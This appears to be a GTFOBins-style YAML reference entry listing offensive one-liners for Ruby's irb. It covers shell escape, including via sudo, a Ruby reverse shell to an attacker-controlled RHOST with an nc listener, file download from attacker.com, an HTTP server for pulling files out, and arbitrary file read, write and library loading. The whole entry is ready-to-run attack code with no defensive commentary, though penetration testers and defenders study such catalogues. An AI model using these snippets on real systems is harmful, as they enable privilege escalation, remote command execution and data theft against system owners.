---
functions:
  shell:
    - code: |
        irb
        exec '/bin/bash'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST='127.0.0.1'
        export RPORT=9000
        irb
        require 'socket'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end
  file-upload:
    - description: Serve files in the local folder running an HTTP server on port 8888.
      code: |
        irb
        require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        irb
        require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])
  file-write:
    - code: |
        irb
        File.open("file_to_write", "w+") { |f| f.write("DATA") }
  file-read:
    - code: |
        irb
        puts File.read("file_to_read")
  library-load:
    - code: |
        irb
        require "fiddle"; Fiddle.dlopen("lib.so")
  sudo:
    - code: |
        sudo irb
        exec '/bin/bash'
---
